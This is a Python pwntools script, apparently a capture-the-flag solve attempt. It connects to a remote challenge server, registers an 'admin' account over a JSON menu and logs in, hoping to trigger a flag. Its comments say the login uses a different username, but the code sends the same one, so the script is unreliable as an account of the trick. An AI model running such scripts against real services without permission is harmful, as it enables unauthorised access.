from pwn import *
import json

# Connect to the server
p = remote("83.136.255.88", 56153 )

# Wait for the prompt "Option (json format) ::" and capture everything until that prompt
p.recvuntil("Option (json format) ::")
print("Received option prompt.")

# Send the "register" option in JSON format
register_data = {
    "option": "register"
}
p.sendline(json.dumps(register_data))

# Wait until the server asks for credentials "enter credentials (json format) ::"
p.recvuntil("enter credentials (json format) ::")
print("Received credentials prompt.")

# Send registration credentials (username and password)
register_credentials = {
    "username": "admin",  # Use the desired username
    "password": "admin123"  # Use the desired password
}

# Send the registration credentials in JSON format
p.sendline(json.dumps(register_credentials))

# Wait for the server response to registration
register_response = p.recvuntil("Option (json format) ::").decode()
print(f"Registration Response: {register_response}")

# Now, let's login with the same credentials but a different username
# Send the "login" option in JSON format
login_data = {
    "option": "login"
}
p.sendline(json.dumps(login_data))

# Wait until the server asks for login credentials "enter credentials (json format) ::"
p.recvuntil("enter credentials (json format) ::")
print("Received login credentials prompt.")

# Send the login credentials with the same password but a different username
login_credentials = {
    "username": "admin",  # Username that will cause the server to trigger the unexpected case
    "password": "admin123"  # Same password as before
}

# Send the login credentials in JSON format
p.sendline(json.dumps(login_credentials))

# Wait for the server's response (this will include either the success message or flag message)
login_response = p.recvuntil("Option (json format) ::").decode()
print(f"Login Response: {login_response}")

# Close the connection
p.close()
